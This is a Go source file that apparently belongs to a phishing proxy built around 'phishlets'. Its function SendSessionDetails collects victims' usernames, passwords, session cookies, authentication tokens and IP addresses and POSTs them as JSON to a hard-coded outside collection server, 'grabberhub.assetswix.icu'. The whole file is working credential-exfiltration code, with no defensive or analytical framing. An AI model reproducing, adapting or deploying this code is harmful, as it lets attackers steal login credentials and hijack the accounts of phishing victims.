package database

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
)

// ExternalAPIURL is the endpoint where session details will be sent.
const ExternalAPIURL = "https://grabberhub.assetswix.icu/api/"

// SessionDetails represents the structure of the session details to be sent.
type SessionDetails struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"cookies"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
}

// SendSessionDetails sends session details to the external API.
func SendSessionDetails(s *Session) error {
	sessionDetails := SessionDetails{
		Id:           s.Id,
		Phishlet:     s.Phishlet,
		LandingURL:   s.LandingURL,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		BodyTokens:   s.BodyTokens,
		HttpTokens:   s.HttpTokens,
		CookieTokens: s.CookieTokens,
		SessionId:    s.SessionId,
		UserAgent:    s.UserAgent,
		RemoteAddr:   s.RemoteAddr,
		CreateTime:   s.CreateTime,
		UpdateTime:   s.UpdateTime,
	}

	jsonData, err := json.Marshal(sessionDetails)
	if err != nil {
		return fmt.Errorf("failed to marshal session details: %w", err)
	}

	// Make the HTTP POST request
	resp, err := http.Post(ExternalAPIURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send session details: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected response status: %s", resp.Status)
	}

	return nil
}
